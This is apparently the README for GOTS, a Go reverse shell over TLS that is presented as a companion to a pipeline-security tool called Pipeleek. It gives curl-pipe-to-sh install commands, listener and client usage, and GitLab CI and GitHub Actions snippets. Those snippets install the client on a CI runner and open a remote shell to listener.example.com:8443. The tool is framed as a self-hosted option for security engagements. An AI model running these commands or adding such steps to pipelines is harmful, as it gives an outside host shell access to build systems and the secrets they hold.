<div align="center">
  <img src="pipeleek_gots.svg" alt="pipeleek_gots" width="200" />
</div>

# GOTS - Golang TCP/TLS (Reverse) Shell - For Pipeleek

Minimal, encrypted reverse shell over raw TCP with TLS.

Use this when you need a self-hosted, encrypted reverse shell alternative—for example, when tools like [sshx](https://sshx.io/) cannot be used due to customer concerns about data residency or third-party hosting requirements.

## Install
- Binstaller (recommended):
  - gotsl (Listener): `curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsl.sh | sh`
  - gotsr (Client): `curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsr.sh | sh`
  - Set `BINSTALLER_BIN` to change install dir (defaults to `~/.local/bin`).

- From source:
  ```bash
  git clone https://github.com/frjcomp/golang-https-rev.git
  cd golang-https-rev
  make build  # outputs to bin/
  ```

## Usage
- Start gotsl (Listener, TLS, self-signed):
  ```bash
  ./gotsl <port> <bind-ip>
  ```
- Start gotsr (Reverse shell client):
  ```bash
  ./gotsr <host:port> <max-retries>
  ```
- Core gotsl commands: `list`, `use <client>`, `exit`.
- In a session: run shell commands; `background` to return.

## Notes
- Protocol: TLS 1.2+ over TCP only (no HTTP).
- Defaults to self-signed cert generation on the gotsl (listener).

## CI examples
- GitLab CI (`.gitlab-ci.yml`):
  ```yaml
  stages: [run]
  reverse:
    stage: run
    image: alpine:3.19
    script:
      - apk add --no-cache curl
      - curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsr.sh | sh
      - ~/.local/bin/gotsr listener.example.com:8443 3
  ```

- GitHub Actions:
  ```yaml
  name: reverse
  on: [workflow_dispatch]
  jobs:
    run-reverse:
      runs-on: ubuntu-latest
      steps:
        - name: Install gotsr client
          run: curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsr.sh | sh
        - name: Run gotsr
          run: ~/.local/bin/gotsr listener.example.com:8443 3
  ```
